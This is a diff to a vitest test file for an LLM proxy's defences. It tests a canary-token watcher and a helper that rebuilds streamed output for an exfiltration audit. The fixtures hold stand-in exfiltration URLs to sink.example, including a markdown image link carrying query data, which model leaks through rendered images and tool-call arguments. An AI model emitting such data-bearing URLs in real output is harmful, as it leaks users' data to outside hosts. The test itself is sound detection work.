@@ -2,7 +2,7 @@ import { describe, it, expect, beforeEach, afterEach } from 'vitest'
 import fs from 'node:fs'
 import { join } from 'node:path'
 import { tmpdir } from 'node:os'
-import { canaryToken, injectCanary, CanaryWatch } from '../../src/proxy/canary.js'
+import { canaryToken, injectCanary, CanaryWatch, sseStreamText } from '../../src/proxy/canary.js'
 import { getParser } from '../../src/detection/parsers.js'
 
 // #539: a token appended to the system prompt that the model has no reason to
@@ -102,5 +102,23 @@ describe('CanaryWatch', () => {
     const watch = new CanaryWatch(TOKEN)
     const ev = `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: `{"note":"${TOKEN}"}` } })}\n\n`
     expect(watch.push(ev)).toBe(true)
+  })
+})
+
+// #674: the end-of-stream exfil audit reads this, so a URL split across
+// deltas, in text or in tool-call arguments, is whole.
+describe('sseStreamText', () => {
+  const ev = (data: unknown) => `event: x\ndata: ${JSON.stringify(data)}\n\n`
+  it('joins text and tool-call argument deltas, decoded, in order', () => {
+    const sse = ev({ type: 'message_start', message: { id: 'msg_1', model: 'claude-x' } })
+      + ev({ type: 'content_block_delta', delta: { type: 'text_delta', text: '![a](https://sink.example/a-' } })
+      + ev({ type: 'content_block_delta', delta: { type: 'text_delta', text: '1?d=s&t)' } })
+      + ev({ type: 'content_block_delta', delta: { type: 'input_json_delta', partial_json: '{"url":"https://sink.example/' } })
+      + ev({ type: 'content_block_delta', delta: { type: 'input_json_delta', partial_json: 'b"}' } })
+      + 'data: [DONE]\n\n'
+    expect(sseStreamText(sse)).toBe('![a](https://sink.example/a-1?d=s&t){"url":"https://sink.example/b"}')
+  })
+  it('reads CRLF-separated events', () => {
+    expect(sseStreamText('data: {"delta":"a"}\r\n\r\ndata: {"delta":"b"}\r\n\r\n')).toBe('ab')
   })
 })
